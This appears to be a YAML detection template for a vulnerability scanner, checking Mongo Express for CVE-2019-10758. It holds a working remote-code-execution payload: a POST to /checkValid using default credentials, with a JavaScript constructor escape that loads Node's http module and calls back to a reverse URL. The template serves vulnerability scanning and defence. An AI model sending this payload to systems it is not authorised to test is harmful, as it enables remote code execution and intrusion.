name: poc-yaml-mongo-express-cve-2019-10758
manual: true
transport: http
set:
    reverse: newReverse()
    reverseURL: reverse.url
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /checkValid
            headers:
                Authorization: Basic YWRtaW46cGFzcw==
            body: document=this.constructor.constructor('return process')().mainModule.require('http').get('{{reverseURL}}')
            follow_redirects: true
        expression: reverse.wait(5)
expression: r0()
detail:
    author: fnmsd(https://github.com/fnmsd)
    links:
        - https://github.com/masahiro331/CVE-2019-10758
        - https://www.twilio.com/blog/2017/08/http-requests-in-node-js.html
    description: Mongo Express CVE-2019-10758 Code Execution
    vulnpath: /checkValid
